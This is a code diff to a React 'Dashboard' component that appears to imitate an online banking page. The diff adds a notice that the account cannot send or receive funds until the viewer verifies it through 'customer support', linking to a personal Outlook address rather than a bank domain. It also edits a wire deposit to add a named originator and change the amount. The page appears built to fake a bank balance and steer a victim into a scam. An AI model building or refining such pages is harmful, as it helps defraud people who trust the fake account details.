@@ -107,9 +107,21 @@ const Dashboard = () => {
       {/* Top Red Header */}
       <div className="h-14 bg-[#C8102E] w-full"></div>
 
+<p className="text-sm text-[#6B7280] leading-relaxed mt-5">
+  This account is currently unavailable to send or receive funds.  
+  Please contact customer support to verify your account and proceed with the transaction.{" "}
+  <a
+    href="mailto:Ascendonline1@outlook.com?subject=Transaction%20Verification%20Required"
+    className="text-[#C8102E] font-medium hover:underline"
+  >
+    Contact support
+  </a>
+</p>
+
       <div className="max-w-7xl mx-auto px-6 py-8 grid grid-cols-1 lg:grid-cols-3 gap-8">
 
         <div className="space-y-6">
+         
 
          <div className="bg-white border border-[#E6E8EC] rounded-lg p-5 flex items-center justify-between">
   <div className="flex items-center gap-3">
@@ -237,14 +249,14 @@ const Dashboard = () => {
                 <div className="border-t border-[#E5E7EB] pt-4 flex justify-between">
                   <div>
                     <p className="font-medium text-[#2F2F2F]">
-                      Deposit by Wire 0000095372
+                      Deposit by Wire 0000095372 Wire Originator William E ADCOCK
                     </p>
                     <p className="text-[#6B7280]">
                       Basic Checking
                     </p>
                   </div>
                   <span className="text-[#16A34A] font-medium">
-                    +$10,000.00
+                    +$9,995.00
                   </span>
                 </div>
               </div>
